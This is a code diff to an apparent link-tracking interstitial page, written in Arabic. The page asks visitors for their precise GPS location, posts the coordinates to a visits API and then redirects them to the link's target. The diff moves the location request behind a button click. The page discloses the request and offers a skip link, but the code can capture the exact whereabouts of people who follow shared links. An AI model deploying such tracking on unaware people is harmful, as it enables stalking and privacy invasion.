@@ -368,9 +368,9 @@ ${ogMetaTags(link, pageUrl)}
   <div class="wrap"><div class="box">
     <h1 id="hdr">طلب إذن الموقع</h1>
     <p id="msg">الموقع يطلب إذن الحصول على موقعك الدقيق الحالي.<br><span class="sig">مع تحيات يوسف قنديل</span></p>
-    <div class="spin" id="spin"></div>
-    <div class="progress" id="prog">في انتظار ردك على طلب المتصفح…</div>
-    <a class="btn" id="goNow" href="${target.replace(/"/g, '&quot;')}" style="display:none">المتابعة الآن</a>
+    <div class="spin" id="spin" style="display:none"></div>
+    <div class="progress" id="prog" style="display:none">في انتظار ردك على طلب المتصفح…</div>
+    <a class="btn" id="goNow" href="#">متابعة</a>
     <a class="skip" href="${target.replace(/"/g, '&quot;')}">تخطّي بدون السماح</a>
   </div></div>
 <script>
@@ -384,7 +384,7 @@ ${ogMetaTags(link, pageUrl)}
   var spin=document.getElementById('spin');
   var goBtn=document.getElementById('goNow');
 
-  function showProg(text, cls){ prog.textContent=text; prog.className='progress'+(cls?' '+cls:''); }
+  function showProg(text, cls){ prog.style.display=''; prog.textContent=text; prog.className='progress'+(cls?' '+cls:''); }
   function send(payload,cb){
     try{
       var url='/api/visits/'+encodeURIComponent(visitId)+'/location';
@@ -395,63 +395,67 @@ ${ogMetaTags(link, pageUrl)}
   }
   function go(){ if(done)return; done=true; window.location.replace(target); }
 
-  if(!window.isSecureContext){
-    showProg('⚠️ الصفحة على HTTP — GPS لا يعمل إلا على HTTPS','err');
-    hdr.textContent='الموقع لن يُحسب بدقة';
-    spin.style.display='none';
-    goBtn.style.display='inline-block';
-    setTimeout(go,4000);
-    return;
-  }
-  if(!('geolocation' in navigator)){
-    showProg('المتصفح لا يدعم تحديد الموقع','err');
-    setTimeout(go,1500);
-    return;
-  }
+  goBtn.addEventListener('click', function(e){
+    e.preventDefault();
+    goBtn.style.display='none';
 
-  // Hard fallback: redirect after 30s no matter what.
-  setTimeout(go, 30000);
-
-  var best=null, watchId=null, finished=false;
-  function finish(){
-    if(finished)return; finished=true;
-    try{navigator.geolocation.clearWatch(watchId);}catch(e){}
-    if(best){
-      var acc=Math.round(best.coords.accuracy);
-      showProg('تم تحديد الموقع بدقة ±'+acc+' متر','ok');
-      hdr.textContent='تم! جاري التحويل…';
-      send({latitude:best.coords.latitude,longitude:best.coords.longitude,accuracy:best.coords.accuracy},function(){ setTimeout(go,500); });
-    } else {
-      setTimeout(go,200);
+    if(!window.isSecureContext){
+      showProg('⚠️ الصفحة على HTTP — GPS لا يعمل إلا على HTTPS','err');
+      hdr.textContent='الموقع لن يُحسب بدقة';
+      setTimeout(go,4000);
+      return;
     }
-  }
+    if(!('geolocation' in navigator)){
+      showProg('المتصفح لا يدعم تحديد الموقع','err');
+      setTimeout(go,1500);
+      return;
+    }
 
-  // After 25s, take whatever we have and redirect.
-  setTimeout(function(){ finish(); }, 25000);
+    spin.style.display='';
+    showProg('في انتظار ردك على طلب المتصفح…');
 
-  watchId = navigator.geolocation.watchPosition(
-    function(pos){
-      if(!best || pos.coords.accuracy < best.coords.accuracy) best = pos;
-      var acc=Math.round(best.coords.accuracy);
-      showProg('تم تحديد الموقع بدقة ±'+acc+' متر — تحسين مستمر…','ok');
-      hdr.textContent='جاري تحسين الدقة…';
-      msg.style.display='none';
-      // Stop early if we get a great fix.
-      if(pos.coords.accuracy && pos.coords.accuracy < 15) finish();
-    },
-    function(err){
-      var reason = err && err.code===1 ? 'الإذن مرفوض — لن نتمكن من تحديد موقعك الدقيق'
-                 : err && err.code===2 ? 'الموقع غير متاح (لا يوجد GPS أو Wi-Fi مفيد)'
-                 : err && err.code===3 ? 'انتهت مهلة GPS'
-                 : 'خطأ في تحديد الموقع';
-      showProg('⚠️ '+reason,'err');
-      hdr.textContent='تعذّر تحديد الموقع';
-      goBtn.style.display='inline-block';
-      spin.style.display='none';
-      if(err && err.code===1) setTimeout(go,3000);
-    },
-    {enableHighAccuracy:true,timeout:25000,maximumAge:0}
-  );
+    // Hard fallback: redirect after 30s no matter what.
+    setTimeout(go, 30000);
+
+    var best=null, watchId=null, finished=false;
+    function finish(){
+      if(finished)return; finished=true;
+      try{navigator.geolocation.clearWatch(watchId);}catch(e){}
+      if(best){
+        var acc=Math.round(best.coords.accuracy);
+        showProg('تم تحديد الموقع بدقة ±'+acc+' متر','ok');
+        hdr.textContent='تم! جاري التحويل…';
+        send({latitude:best.coords.latitude,longitude:best.coords.longitude,accuracy:best.coords.accuracy},function(){ setTimeout(go,500); });
+      } else {
+        setTimeout(go,200);
+      }
+    }
+
+    // After 25s, take whatever we have and redirect.
+    setTimeout(function(){ finish(); }, 25000);
+
+    watchId = navigator.geolocation.watchPosition(
+      function(pos){
+        if(!best || pos.coords.accuracy < best.coords.accuracy) best = pos;
+        var acc=Math.round(best.coords.accuracy);
+        showProg('تم تحديد الموقع بدقة ±'+acc+' متر — تحسين مستمر…','ok');
+        hdr.textContent='جاري تحسين الدقة…';
+        msg.style.display='none';
+        if(pos.coords.accuracy && pos.coords.accuracy < 15) finish();
+      },
+      function(err){
+        var reason = err && err.code===1 ? 'الإذن مرفوض — لن نتمكن من تحديد موقعك الدقيق'
+                   : err && err.code===2 ? 'الموقع غير متاح (لا يوجد GPS أو Wi-Fi مفيد)'
+                   : err && err.code===3 ? 'انتهت مهلة GPS'
+                   : 'خطأ في تحديد الموقع';
+        showProg('⚠️ '+reason,'err');
+        hdr.textContent='تعذّر تحديد الموقع';
+        spin.style.display='none';
+        if(err && err.code===1) setTimeout(go,3000);
+      },
+      {enableHighAccuracy:true,timeout:25000,maximumAge:0}
+    );
+  });
 })();
 </script>
 </body>
